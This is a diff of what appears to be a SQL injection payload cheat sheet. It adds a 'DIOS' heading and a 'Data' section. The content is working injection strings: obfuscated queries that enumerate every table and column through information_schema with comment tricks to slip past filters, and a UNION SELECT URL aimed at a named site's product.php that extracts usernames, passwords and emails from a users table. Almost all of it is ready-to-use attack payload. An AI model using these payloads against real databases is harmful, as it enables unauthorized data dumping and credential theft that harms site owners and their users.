@@ -1,3 +1,5 @@
+## DIOS
+
 ````
 concat_ws('<br>','AZZATSSINS',database(),version(),user(),@@hostname,(select(group_concat('<br>',table_name,':',column_name))from(information_schema.columns)where(table_Schema=database())))
  
@@ -24,4 +26,11 @@ export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.co
 (/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)
  
 (/*!50000select*/+concat+(@:=0,(/*!50000select*/+count(*)%20from+/*!50000information_schema.tables*/+WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND@:=concat+(@,0x3c62723e,/*!50000table_name*/)),@))
+````
+
+## Data
+
+````
+usr_login_name,0x3a,usr_pwd,0x3a,usr_email FROM usuarios
+https://www.fz3r0_corps.com/product.php?=-4 UNION SELECT 1,2,(SELECT+GROUP_CONCAT(usr_login_name,0x3a,usr_pwd,0x3a,usr_email+SEPARATOR+0x3c62723e3c62723e)+FROM+usuarios),17 --+-
 ````
